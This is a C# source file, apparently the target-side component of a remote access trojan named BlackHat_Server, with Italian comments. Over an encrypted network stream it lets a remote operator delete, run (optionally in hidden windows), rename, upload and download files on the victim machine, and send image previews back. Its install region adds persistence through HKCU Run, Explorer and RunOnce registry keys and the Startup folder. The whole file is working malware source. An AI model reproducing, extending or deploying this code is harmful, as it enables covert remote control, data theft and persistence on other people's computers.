using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace BlackHat_Server
{
    internal class FileManAction
    {
        private readonly string[] fileNames;

        private string imagePreviewFileName;
        private readonly NetworkStream myNet;
        private string newFolder;

        private string oldFileRename, newFileRename;
        private string startRunMsg;


        public FileManAction(string ctor_File, NetworkStream ctor_Net)
        {
            myNet = ctor_Net;

            //COSTRUISCO LISTA DI FILE
            fileNames = ctor_File.Split('*');
        }

        public FileManAction(NetworkStream ctor_Net)
        {
            myNet = ctor_Net;
        }

        /// <summary>
        ///     Nuovop thread delte file
        /// </summary>
        public void StartDelFile()
        {
            var t = new Thread(DelFile);
            t.IsBackground = true;
            t.Start();
        }


        /// <summary>
        ///     Del File
        /// </summary>
        private void DelFile()
        {
            var error = false;

            foreach (var file in fileNames)
                try
                {
                    if (Directory.Exists(file))
                        Directory.Delete(file, true);
                    else
                        File.Delete(file);
                }
                catch
                {
                    error = true;
                }

            string result;

            if (!error)
                result = "Item(s) successfull Deleted!";
            else
                result = "Not All Item(s) successfull Deleted..";

            var mm = new MsgManager(myNet);
            mm.SendLargeEncryMessage(result, 10000);
        }


        /// <summary>
        ///     Nuovop thread Run Files file
        /// </summary>
        public void StartRunFiles(string ctor_startRunMsg)
        {
            startRunMsg = ctor_startRunMsg;

            var t = new Thread(RunFiles);
            t.IsBackground = true;
            t.Start();
        }


        /// <summary>
        ///     RenameFiles File
        /// </summary>
        private void RunFiles()
        {
            var error = false;
            var normal = true;
            var dosRun = false;

            if (startRunMsg == "DOSRUN")
                dosRun = true;
            else if (startRunMsg == "NORMAL")
                normal = true;
            else
                normal = false;

            foreach (var file in fileNames)
                try
                {
                    if (File.Exists(file))
                    {
                        if (dosRun) // ESECUZIONE DA DOS
                        {
                            var dr = new DosRunner();
                            dr.ExecuteCommand(file);
                        }
                        else // ESECUZIONE NORMALE
                        {
                            var newProc = new Process();
                            newProc.StartInfo.FileName = file;
                            if (normal == false)
                            {
                                newProc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                newProc.StartInfo.CreateNoWindow = true;
                            }

                            newProc.Start();
                        }
                    }
                }
                catch
                {
                    error = true;
                }

            string result;

            if (!error)
                result = "File(s) successfull Runned!";
            else
                result = "Not All File(s) successfull Runned..";

            var mm = new MsgManager(myNet);
            mm.SendLargeEncryMessage(result, 10000);
        }
        //-------------------------


        /// <summary>
        ///     Nuovop thread RenameFiles file
        /// </summary>
        public void StartRename(string oldFile, string newFile)
        {
            oldFileRename = oldFile;
            newFileRename = newFile;

            var t = new Thread(RenameFiles);
            t.IsBackground = true;
            t.Start();
        }


        /// <summary>
        ///     RenameFiles File
        /// </summary>
        private void RenameFiles()
        {
            var error = false;


            try
            {
                if (Directory.Exists(oldFileRename))
                    Directory.Move(oldFileRename, newFileRename);
                else if (File.Exists(oldFileRename))
                    File.Move(oldFileRename, newFileRename);
                else
                    error = true;
            }
            catch
            {
                error = true;
            }


            string result;

            if (!error)
                result = "Item successfull Renamed";
            else
                result = "Renaming Item Error..";

            var mm = new MsgManager(myNet);
            mm.SendLargeEncryMessage(result, 10000);
        }
        //-------------------------


        /// <summary>
        ///     Nuovop thread Create New Folder
        /// </summary>
        public void StartNewFolderCration(string ctor_NewFold)
        {
            newFolder = ctor_NewFold;

            var t = new Thread(CreateNewFolder);
            t.IsBackground = true;
            t.Start();
        }

        private void CreateNewFolder()
        {
            var error = false;

            try
            {
                Directory.CreateDirectory(newFolder);
            }
            catch
            {
                error = true;
            }


            string result;

            if (!error)
                result = "Folder successfull Created!";
            else
                result = "Error Creating new Folder..";

            var mm = new MsgManager(myNet);
            mm.SendLargeEncryMessage(result, 10000);
        }


        /// <summary>
        ///     Nuovop thread Send Image Preview
        /// </summary>
        public void StartImagePreview(string par_ImageFile)
        {
            imagePreviewFileName = par_ImageFile;

            var t = new Thread(SendImagePreview);
            t.IsBackground = true;
            t.Start();
        }

        private void SendImagePreview()
        {
            try
            {
                //RIDIMENSIONO IMMAGINE PREVIEW 150*150
                var siz = new Size(150, 150);
                var iw = new ImageWorker();
                var original = Image.FromFile(imagePreviewFileName);
                var im = iw.resizeImage(original, siz);

                var thumbByte = iw.ImgToJpg(im, 50);

                // byte[] thumbByte = iw.imageToByteArray(im);

                // DISPOSE OGGETTI
                im.Dispose();
                original.Dispose();

                // INVIO FILE
                var mfm = new MsgFileManager(myNet);
                var sent = mfm.SendEncryFileByte(thumbByte, 10000);
            }
            catch
            {
                var mm = new MsgManager(myNet);

                var sent = mm.SendMessage("-1|",
                    10000); // MANDO -1 CLIENT RICEVE -1 COME LUNGHEZZA DEL FILE E CAPISCE CHE C'è UN ERRORE
            }
        }
        //--------------------------------------


        /// <summary>
        ///     Nuovo thread invio preview per gallery
        /// </summary>
        public void StartImageGallery(string par_ImageFile)
        {
            imagePreviewFileName = par_ImageFile;

            var t = new Thread(SendImageGallery);
            t.IsBackground = true;
            t.Start();
        }

        private void SendImageGallery()
        {
            try
            {
                //RIDIMENSIONO IMMAGINE PREVIEW 150*150
                var siz = new Size(150, 150);
                var iw = new ImageWorker();
                var original = Image.FromFile(imagePreviewFileName);
                var im = iw.resizeImage(original, siz);

                var thumbByte = iw.ImgToJpg(im, 50);
                //byte[] thumbByte = iw.imageToByteArray(im);

                // DISPOSE OGGETTI
                im.Dispose();
                original.Dispose();

                // INVIO FILE
                var mfm = new MsgFileManager(myNet);
                var sent = mfm.SendEncryFileByte(thumbByte, 10000);
            }
            catch
            {
                var mm = new MsgManager(myNet);

                var sent = mm.SendMessage("-1|",
                    10000); // MANDO -1 CLIENT RICEVE -1 COME LUNGHEZZA DEL FILE E CAPISCE CHE C'è UN ERRORE
            }
        }
        //--------------------------------------


        /// <summary>
        ///     INVIO FILE TRANSFER
        /// </summary>
        public void SendFileTrans(string fileName)
        {
            try
            {
                var fileByte = File.ReadAllBytes(fileName);

                var mfm = new MsgFileManager(myNet);

                var sent = mfm.SendEncryFileByte(fileByte, 10000);
            }
            catch
            {
                var mm = new MsgManager(myNet);

                var sent = mm.SendMessage("-1|",
                    10000); // MANDO -1 CLIENT RICEVE -1 COME LUNGHEZZA DEL FILE E CAPISCE CHE C'è UN ERRORE
            }
        }


        /// <summary>
        ///     Ricevo FILE TRANSFER
        /// </summary>
        public void ReceiveFile(string fileName)
        {
            try
            {
                // RISPONDO OK PR AVVISARE CHE SONO PRONTO A RICEVERE E POI RICEVO.. MAVA??
                var mm = new MsgManager(myNet);
                var mfm = new MsgFileManager(myNet);

                var sent = mm.SendEncryMessage("OK", 10000);

                if (sent)
                {
                    // byte[] fileNew = mfm.WaitEncryFileByte(15000);

                    var writed = mfm.WaitDiskEncryFileByte(15000, fileName);

                    if (writed)

                        if (writed)
                            mm.SendEncryMessage("OK", 10000);
                        //try
                        //{
                        //    File.WriteAllBytes(fileName, fileNew);
                        //    mm.SendEncryMessage("OK", 10000);   
                        //}
                        //catch 
                        //{
                        //    mm.SendEncryMessage("WRITE FILE ERROR", 10000);   
                        //}
                        else
                            mm.SendEncryMessage("WRITE FILE ERROR", 10000);
                }
            }
            catch
            {
                var mm = new MsgManager(myNet);

                var sent = mm.SendMessage("-1|",
                    10000); // MANDO -1 CLIENT RICEVE -1 COME LUNGHEZZA DEL FILE E CAPISCE CHE C'è UN ERRORE
            }
        }


        #region Install File Region

        private string sFileToInstall;
        private string sInstallCmd;

        /// <summary>
        ///     Avvia thread per l'istallazione di un file
        /// </summary>
        /// <param name="filePath"></param>
        /// <param name="installCmd"></param>
        public void StartInstallFile(string filePath, string installCmd)
        {
            try
            {
                sFileToInstall = filePath;
                sInstallCmd = installCmd;

                var t = new Thread(InstallFileAgent);
                t.IsBackground = true;
                t.Start();
            }
            catch
            {
            }
        }
        //-----------------------------------

        /// <summary>
        ///     Agente di installazione di un file
        /// </summary>
        private void InstallFileAgent()
        {
            var mfm = new MsgManager(myNet);

            try
            {
                // CONTROLLO CHE IL FILE ESSITA
                var fileExist = File.Exists(sFileToInstall);

                if (!fileExist)
                {
                    mfm.SendEncryMessage(string.Format("{0} not exist!", sFileToInstall), 10000);
                    return;
                }


                // PARSING DELLA RICHIESTA DI INSTALLAZIONE
                var installSplit = sInstallCmd.Split('-');

                var result = "";

                // ESEGUO LE RICHIESTE
                foreach (var item in installSplit)
                {
                    var details = item.Split(',');

                    switch (details[0])
                    {
                        case "HKCU":
                            var rm = new RegistryManager();
                            var hkcuOK = rm.AddHKCUReg(details[1], sFileToInstall);
                            result += string.Format("HKCU-{0}|", hkcuOK);
                            break;

                        case "EXPL":
                            var rme = new RegistryManager();
                            var exploOk = rme.AddExplorerReg(details[1], sFileToInstall);
                            result += string.Format("EXPL-{0}|", exploOk);
                            break;

                        case "RUNONC":
                            var rmro = new RegistryManager();
                            var runOnceOk = rmro.AddHKCURunOnceReg(details[1], sFileToInstall);
                            result += string.Format("RUNONC-{0}|", runOnceOk);
                            break;

                        case "FOLD":

                            try
                            {
                                var startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                                File.Copy(sFileToInstall, Path.Combine(startupFolder, Path.GetFileName(sFileToInstall)),
                                    true);

                                result += "FOLD-true|";
                            }
                            catch
                            {
                                result += "FOLD-false|";
                            }


                            break;
                    }
                }

                result = result.TrimEnd('|');

                mfm.SendEncryMessage(result, 10000); // NOTIFICO RISULTATO
            }
            catch
            {
                try
                {
                    // provo a segnalare l'errore al client
                    mfm.SendEncryMessage("Error in install file.", 10000);
                }
                catch
                {
                }
            }
        }
        //-------------------------

        #endregion
    }
}